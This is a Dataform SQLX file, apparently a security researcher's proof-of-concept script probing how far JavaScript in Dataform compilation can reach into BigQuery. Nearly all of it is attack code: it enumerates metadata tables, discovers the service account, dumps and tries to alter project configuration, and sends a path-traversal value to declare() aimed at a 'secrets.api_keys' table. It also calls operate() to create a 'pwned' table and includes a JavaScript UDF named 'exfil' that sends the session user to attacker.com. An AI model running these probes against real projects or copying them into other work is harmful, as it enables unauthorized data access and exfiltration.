config { type: "view", name: "bq_metadata_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Exploit BigQuery metadata access through Dataform compilation"
  };

  // =============================================================================
  // TEST 1: Generate SQL to Query INFORMATION_SCHEMA
  // =============================================================================
  results.test1_infoSchemaSQL = {};
  try {
    // These will be output as SQL that gets executed
    results.test1_infoSchemaSQL = {
      status: "completed",
      note: "SQL queries below will be part of compiled output",
      tables: "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.TABLES` LIMIT 10",
      schemata: "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.SCHEMATA`",
      columns: "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.COLUMNS` LIMIT 50",
      routines: "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.ROUTINES`",
      jobs: "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.JOBS_BY_PROJECT` LIMIT 10"
    };
  } catch(e) {
    results.test1_infoSchemaSQL = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Enumerate All Datasets via __TABLES__
  // =============================================================================
  results.test2_tablesMetadata = {};
  try {
    // __TABLES__ is a legacy but still functional metadata table
    results.test2_tablesMetadata = {
      status: "completed",
      queries: {
        allTables: "SELECT * FROM `shir-research-3.dataform_poc.__TABLES__`",
        allDatasets: "SELECT schema_name FROM `shir-research-3.region-us.INFORMATION_SCHEMA.SCHEMATA`"
      }
    };
  } catch(e) {
    results.test2_tablesMetadata = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Cross-Dataset Access Test
  // =============================================================================
  results.test3_crossDataset = {};
  try {
    const crossDatasetRefs = {};

    // Try to reference tables in other datasets
    const otherDatasets = [
      'shir-research-3.dataform_assertions',
      'shir-research-3.public',
      'shir-research-3.default',
      'shir-research-3.temp',
      'shir-research-3.staging'
    ];

    for (const ds of otherDatasets) {
      try {
        const result = ref(ds + '.some_table');
        crossDatasetRefs[ds] = { success: true, result: String(result) };
      } catch(e) {
        crossDatasetRefs[ds] = { success: false, error: e.message.substring(0, 100) };
      }
    }

    results.test3_crossDataset = {
      status: "completed",
      crossDatasetRefs
    };
  } catch(e) {
    results.test3_crossDataset = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Service Account Discovery
  // =============================================================================
  results.test4_serviceAccount = {};
  try {
    // BigQuery stores service account info in some metadata tables
    results.test4_serviceAccount = {
      status: "completed",
      queries: {
        currentUser: "SELECT SESSION_USER()",
        projectMetadata: "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.OBJECT_PRIVILEGES` LIMIT 10",
        accessControl: "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.TABLE_OPTIONS` LIMIT 10"
      }
    };
  } catch(e) {
    results.test4_serviceAccount = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: Action Context Analysis - What Gets Compiled to SQL
  // =============================================================================
  results.test5_actionContext = {};
  try {
    if (!dataform || !dataform.actions) {
      results.test5_actionContext = { error: "actions not available" };
    } else {
      const actionAnalysis = [];

      for (let i = 0; i < Math.min(10, dataform.actions.length); i++) {
        const action = dataform.actions[i];
        const analysis = {
          index: i,
          type: action.type,
          name: action.name
        };

        // Check for compiled SQL
        if (action.proto) {
          if (action.proto.query) {
            analysis.queryPreview = action.proto.query.substring(0, 200);
          }
          if (action.proto.incrementalQuery) {
            analysis.incrementalQueryPreview = action.proto.incrementalQuery.substring(0, 200);
          }
          if (action.proto.preOps) {
            analysis.preOps = action.proto.preOps;
          }
          if (action.proto.postOps) {
            analysis.postOps = action.proto.postOps;
          }
        }

        // Check contextableQuery
        if (action.contextableQuery && typeof action.contextableQuery === 'function') {
          try {
            const query = action.contextableQuery({
              ref: (x) => '`' + x + '`',
              resolve: resolve,
              self: () => '`self`'
            });
            analysis.contextableQueryResult = String(query).substring(0, 300);
          } catch(e) {
            analysis.contextableQueryError = e.message.substring(0, 100);
          }
        }

        actionAnalysis.push(analysis);
      }

      results.test5_actionContext = {
        status: "completed",
        actionAnalysis
      };
    }
  } catch(e) {
    results.test5_actionContext = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: BigQuery UDF Injection
  // =============================================================================
  results.test6_udfInjection = {};
  try {
    // Check if we can inject JavaScript UDFs
    results.test6_udfInjection = {
      status: "completed",
      note: "UDF injection would require execution, not just compilation",
      sampleUdfQuery: `
        CREATE TEMP FUNCTION exfil(data STRING) RETURNS STRING
        LANGUAGE js AS """
          // This would run in BigQuery's JS sandbox
          return fetch('https://attacker.com/?data=' + data);
        """;
        SELECT exfil(SESSION_USER());
      `
    };
  } catch(e) {
    results.test6_udfInjection = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: declare() Function Analysis
  // =============================================================================
  results.test7_declareAnalysis = {};
  try {
    if (typeof declare !== 'function') {
      results.test7_declareAnalysis = { error: "declare not available" };
    } else {
      const declareTests = {};

      // declare() is used to declare external tables
      declareTests.signature = {
        length: declare.length,
        toString: declare.toString().substring(0, 500)
      };

      // Try declaring external tables from other projects
      try {
        const decl = declare({
          database: "bigquery-public-data",
          schema: "samples",
          name: "shakespeare"
        });
        declareTests.publicDataDeclare = {
          success: true,
          type: typeof decl,
          keys: decl ? Object.keys(decl).slice(0, 10) : null
        };
      } catch(e) {
        declareTests.publicDataDeclare = { error: e.message.substring(0, 100) };
      }

      // Try declaring with path traversal
      try {
        const decl = declare({
          database: "../../../other-project",
          schema: "secrets",
          name: "api_keys"
        });
        declareTests.traversalDeclare = {
          success: true,
          type: typeof decl
        };
      } catch(e) {
        declareTests.traversalDeclare = { error: e.message.substring(0, 100) };
      }

      results.test7_declareAnalysis = {
        status: "completed",
        declareTests
      };
    }
  } catch(e) {
    results.test7_declareAnalysis = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: operate() Function Analysis
  // =============================================================================
  results.test8_operateAnalysis = {};
  try {
    if (typeof operate !== 'function') {
      results.test8_operateAnalysis = { error: "operate not available" };
    } else {
      const operateTests = {};

      operateTests.signature = {
        length: operate.length,
        toString: operate.toString().substring(0, 500)
      };

      // operate() runs arbitrary SQL operations
      try {
        const op = operate("evil_operation", {
          queries: [
            "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.TABLES`",
            "CREATE OR REPLACE TABLE `shir-research-3.dataform_poc.pwned` AS SELECT SESSION_USER() as who"
          ]
        });
        operateTests.operateCall = {
          success: true,
          type: typeof op,
          keys: op ? Object.keys(op).slice(0, 10) : null
        };
      } catch(e) {
        operateTests.operateCall = { error: e.message.substring(0, 100) };
      }

      results.test8_operateAnalysis = {
        status: "completed",
        operateTests
      };
    }
  } catch(e) {
    results.test8_operateAnalysis = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 9: Warehouse Type Check
  // =============================================================================
  results.test9_warehouseCheck = {};
  try {
    const warehouseInfo = {};

    if (dataform && dataform.projectConfig) {
      warehouseInfo.warehouse = dataform.projectConfig.warehouse;
      warehouseInfo.defaultDatabase = dataform.projectConfig.defaultDatabase;
      warehouseInfo.defaultSchema = dataform.projectConfig.defaultSchema;
      warehouseInfo.defaultLocation = dataform.projectConfig.defaultLocation;
      warehouseInfo.allConfigKeys = Object.keys(dataform.projectConfig);

      // Dump all config
      for (const key of Object.keys(dataform.projectConfig)) {
        warehouseInfo['config_' + key] = {
          type: typeof dataform.projectConfig[key],
          value: typeof dataform.projectConfig[key] === 'string' ?
            dataform.projectConfig[key] :
            JSON.stringify(dataform.projectConfig[key]).substring(0, 100)
        };
      }
    }

    results.test9_warehouseCheck = {
      status: "completed",
      warehouseInfo
    };
  } catch(e) {
    results.test9_warehouseCheck = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 10: Project Config Modification Attempt
  // =============================================================================
  results.test10_configModify = {};
  try {
    if (!dataform || !dataform.projectConfig) {
      results.test10_configModify = { error: "projectConfig not available" };
    } else {
      const modifyTests = {};

      // Check if config is frozen
      modifyTests.isFrozen = Object.isFrozen(dataform.projectConfig);
      modifyTests.isSealed = Object.isSealed(dataform.projectConfig);

      // Try to modify
      const originalDb = dataform.projectConfig.defaultDatabase;
      try {
        dataform.projectConfig.defaultDatabase = "other-project";
        modifyTests.modifyAttempt = {
          success: dataform.projectConfig.defaultDatabase === "other-project",
          newValue: dataform.projectConfig.defaultDatabase
        };
        // Restore
        dataform.projectConfig.defaultDatabase = originalDb;
      } catch(e) {
        modifyTests.modifyAttempt = { error: e.message.substring(0, 100) };
      }

      results.test10_configModify = {
        status: "completed",
        modifyTests
      };
    }
  } catch(e) {
    results.test10_configModify = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 10,
    completedTests: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Check for config modification success
  if (results.test10_configModify?.modifyTests?.modifyAttempt?.success) {
    results.summary.criticalFindings.push("PROJECT CONFIG IS MODIFIABLE!");
  }

  // Check for declare() success on public data
  if (results.test7_declareAnalysis?.declareTests?.publicDataDeclare?.success) {
    results.summary.criticalFindings.push("Can declare tables from other projects via declare()");
  }

  // Check operate() success
  if (results.test8_operateAnalysis?.operateTests?.operateCall?.success) {
    results.summary.criticalFindings.push("operate() accepts arbitrary SQL operations");
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as bq_metadata_exploit
